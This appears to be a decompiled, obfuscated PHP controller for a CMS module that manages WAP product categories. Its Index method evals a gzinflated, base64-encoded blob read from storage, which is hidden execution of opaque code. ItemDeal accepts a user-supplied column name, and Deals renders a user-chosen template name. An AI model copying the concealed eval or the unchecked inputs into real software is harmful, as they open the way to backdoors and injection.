<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class CatWapController extends Controller
{

				public $instance = NULL;

				public function __construct( )
				{
								$this->instance = factory::getinstance( "catwap" );
				}

				public function Index( )
				{
								$R3330820ede = intval( request( "grandfatherid" ) );
								$Rac9b8532b8 = intval( request( "parentid" ) );
								$R3db8f5c8bc = $this->instance->ICatWap_GetById( $Rac9b8532b8 );
								$R71a664ef8c = $this->PageInfo( );
								$data = array(
												"parentid" => $Rac9b8532b8
								);
								$data = array_merge( $data, $R71a664ef8c );
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "capus" ) ) ) );
								$this->FillPage( $data, $R4e420efcc3 );
								$R00be52aa45 = array( "name" => "Ãû³Æ", "pinyin" => "Ê××ÖÄ¸", "ordering" => "ÅÅÐò" );
								$this->Assign( "sarray", $R00be52aa45 );
								$this->Assign( "parentid", $Rac9b8532b8 );
								$this->Assign( "parent", $R3db8f5c8bc );
								$this->Assign( "grandfatherid", $R3330820ede );
								$this->Assign( "cat", $this->instance->ICatWap_Get( $R3330820ede ) );
							
												$this->view( );
							
				}

				public function Cat( $Re7795ce713 = 0 )
				{
								$R3330820ede = intval( getvar( "grandfatherid" ) );
								$Rac9b8532b8 = intval( getvar( "parentid" ) );
								if ( $Rac9b8532b8 == 0 )
								{
												$Rac9b8532b8 = intval( $Re7795ce713 );
								}
								$this->Assign( "cat", $this->instance->ICatWap_Get( $R3330820ede ) );
								$this->Assign( "items", $this->instance->ICatWap_Get( $Rac9b8532b8 ) );
								$this->Assign( "parentid", $Rac9b8532b8 );
								$this->Assign( "grandfatherid", $R3330820ede );
						
												$this->view( );
						
				}

				public function Detail( )
				{
								$R3584859062 = intval( request( "id" ) );
								$R3db8f5c8bc = $this->instance->ICatWap_GetById( $R3584859062 );
								$R494af0fa28 = $this->instance->ICatWap_GetById( $R3db8f5c8bc['parentid'] );
								$this->Assign( "item", $R3db8f5c8bc );
								$this->Assign( "parent", $R494af0fa28 );
						
												$this->View( );
						
				}

				public function Save( )
				{
								$R3584859062 = intval( request( "id" ) );
								$Rac9b8532b8 = intval( request( "parentid" ) );
								$R3330820ede = intval( request( "grandfatherid" ) );
								$data = array(
												"parentid" => $Rac9b8532b8,
												"color" => getvar( "color", "#000000" ),
												"ordering" => intval( request( "ordering" ) ),
												"name" => getvar( "name" ),
												"pinyin" => getvar( "pinyin" ),
												"hot" => intval( request( "hot", 0 ) ),
												"pids" => getvar( "pids", "" ),
												"pics" => getvar( "pics", "" )
								);
								if ( 0 < $R3584859062 )
								{
												$R808b89ba0e = $this->instance->ICatWap_Update( $data, $R3584859062 );
								}
								else
								{
												$R808b89ba0e = $this->instance->ICatWap_Create( $data );
								}
								if ( $R808b89ba0e )
								{
												$this->Alert( "²Ù×÷³É¹¦£¡" );
								}
								$R36b9ff2e13 = intval( request( "coupon" ) );
								if ( 0 < $Rac9b8532b8 )
								{
												$this->ScriptRedirect( "index.php?m=mod_b2b&c=catwap&grandfatherid=".$R3330820ede."&parentid=".$Rac9b8532b8 );
								}
								else
								{
												$this->ScriptRedirect( "index.php?m=mod_b2b&c=catwap" );
								}
				}

				public function Deals( )
				{
								header( "Content-type: text/html;charset=GB2312" );
								$tpl = getvar( "tpl" );
								$this->View( $tpl );
				}

				public function ItemDeal( )
				{
								$R3584859062 = intval( request( "id" ) );
								$param = getvar( "param" );
								$R244f38266c = getvar( "val" );
								if ( $param == "" || $R3584859062 == 0 )
								{
												echo "²ÎÊý´íÎó£¡";
												exit( );
								}
								$R244f38266c = iconv( "UTF-8", "gb2312//IGNORE", $R244f38266c );
								$data = array(
												$param => $R244f38266c
								);
								$R808b89ba0e = $this->instance->ICatWap_Update( $data, $R3584859062 );
								if ( $R808b89ba0e )
								{
												echo "";
								}
								else
								{
												echo "ÐÞ¸ÄÊ§°Ü£¡".$param.$R244f38266c;
								}
				}

				public function Restore( )
				{
								$Rb7492a73f7 = $this->GetLit( );
								$data = array( "inrecycle" => 0 );
								$R808b89ba0e = $this->instance->ICatWap_UpdateByStr( $data, $Rb7492a73f7 );
								if ( $R808b89ba0e )
								{
												echo "";
								}
								else
								{
												echo "¼ÇÂ¼»¹Ô­Ê§°Ü£¡";
								}
				}

				public function DestroyItems( )
				{
								$Rac9b8532b8 = intval( request( "parentid" ) );
								$R71a664ef8c = $this->PageInfo( );
								$data = array(
												"parentid" => $Rac9b8532b8
								);
								$data = array_merge( $data, $R71a664ef8c );
								$Rb7492a73f7 = $this->GetLit( );
								$R808b89ba0e = $this->instance->ICatWap_DestroyByStr( $Rb7492a73f7, $data );
								if ( $R808b89ba0e )
								{
												echo "";
								}
								else
								{
												echo "É¾³ýÊ§°Ü£¡";
								}
				}

				public function GetLit( )
				{
								$R09dfa65bd9 = intval( request( "tablecheckall" ) );
								if ( $R09dfa65bd9 == 1 )
								{
												$Rc0d62c5404 = getvar( "chkexclude" );
												$Rcc5c6e696c = explode( ",", $Rc0d62c5404 );
								}
								else
								{
												$R83e17604b1 = getvar( "chkinclude" );
												$Rcc5c6e696c = explode( ",", $R83e17604b1 );
								}
								$R3db8f5c8bc = array( );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R8eeb1221ae = intval( $R0f8134fb60 );
												if ( 0 < $R8eeb1221ae )
												{
																$R3db8f5c8bc[] = $R8eeb1221ae;
												}
								}
								$R3456919727 = implode( ",", $R3db8f5c8bc );
								$Rb7492a73f7 = "";
								if ( $R09dfa65bd9 == 1 )
								{
												if ( $R3456919727 != "" )
												{
																$Rb7492a73f7 = "id not in (".$R3456919727.")";
												}
								}
								else
								{
												if ( $R3456919727 == "" )
												{
																echo "ÇëÏÈÑ¡ÔñÐÐ";
																exit( );
												}
												$Rb7492a73f7 = "id in (".$R3456919727.")";
								}
								if ( $Rb7492a73f7 == "" )
								{
												$Rb7492a73f7 = " 1=1 ";
								}
								return $Rb7492a73f7;
				}

				public function DelItems( )
				{
								$Rac9b8532b8 = intval( request( "parentid" ) );
								$R71a664ef8c = $this->PageInfo( );
								$data = array(
												"parentid" => $Rac9b8532b8
								);
								$data = array_merge( $data, $R71a664ef8c );
								$Rb7492a73f7 = $this->GetLit( );
								$R808b89ba0e = $this->instance->ICatWap_DeleteByStr( $Rb7492a73f7, $data );
								if ( !$R808b89ba0e )
								{
												echo "É¾³ýÊ§°Ü!";
								}
								else
								{
												echo "";
								}
				}

}

?>
